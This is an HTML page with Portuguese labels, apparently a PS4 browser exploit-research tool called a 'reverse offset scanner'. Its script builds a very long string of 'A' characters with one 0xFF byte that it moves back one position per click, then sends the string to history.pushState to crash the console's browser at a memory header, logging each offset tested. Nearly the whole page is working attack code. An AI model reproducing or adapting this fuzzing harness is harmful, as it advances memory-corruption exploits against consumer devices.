<!DOCTYPE html>
<html>
<head>
    <title>PS4 Reverse Offset Scanner</title>
    <style>
        body { background-color: #111; color: #ff3333; font-family: monospace; padding: 20px; text-align: center; }
        
        #counter { 
            font-size: 80px; 
            color: #fff; 
            font-weight: bold; 
            margin: 20px 0;
            border: 4px solid #333;
            padding: 20px;
            background: #222;
        }

        button { 
            font-size: 30px; 
            padding: 30px; 
            width: 100%; 
            border: 4px solid #ff3333; 
            background: #550000; 
            color: #fff; 
            cursor: pointer; 
            font-weight: bold;
        }
        
        button:active { background: #ff0000; }

        #log { margin-top: 20px; color: #888; font-size: 18px; text-align: left; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 10px;}
        .safe { color: #0f0; }
    </style>
</head>
<body>

    <h1>SCANNER REVERSO (Busca de Header)</h1>
    <p>Estamos injetando 0xFF. O console vai travar quando batermos no Header.</p>

    <div id="counter">709523</div>

    <button onclick="testAndDecrement()">DISPARAR (0xFF) & RECUAR</button>
    
    <div id="log">Pronto. Clique para começar do 709522.</div>

    <script>
        // Começamos 1 acima para o primeiro clique baixar para 709522
        let currentOffset = 709523; 
        
        // Limite de segurança (para manter o tamanho total da string constante)
        const TOTAL_SIZE = 709525; 

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `<div>${msg}</div>` + el.innerHTML;
        }

        function testAndDecrement() {
            // 1. Decrementa primeiro
            currentOffset--;
            
            // Atualiza visual
            document.getElementById('counter').innerText = currentOffset;

            // 2. Prepara o ataque
            // A ideia é manter a string do mesmo tamanho total, 
            // mas mover o byte 0xFF para trás a cada passo.
            
            setTimeout(() => {
                try {
                    // Parte A: 'A's até o ponto de teste
                    let buffer = "A".repeat(currentOffset);
                    
                    // Parte B: A BOMBA (0xFF)
                    buffer += "\xFF";
                    
                    // Parte C: Preencher o resto com 'A's para não alterar o tamanho total do buffer
                    // (Isso evita que o crash seja por mudança de tamanho)
                    let remaining = TOTAL_SIZE - (currentOffset + 1);
                    if (remaining > 0) {
                        buffer += "A".repeat(remaining);
                    }

                    // Log antes de disparar (caso trave, você viu o número)
                    log(`Testando offset ${currentOffset} com 0xFF...`);

                    // DISPARAR
                    history.pushState({}, "rev_scan", "/" + buffer);
                    
                    // Se chegou aqui, sobreviveu
                    log(`<span class="safe">Offset ${currentOffset}: SEGURO (Aceita 0xFF)</span>`);

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 100);
        }
    </script>
</body>
</html>
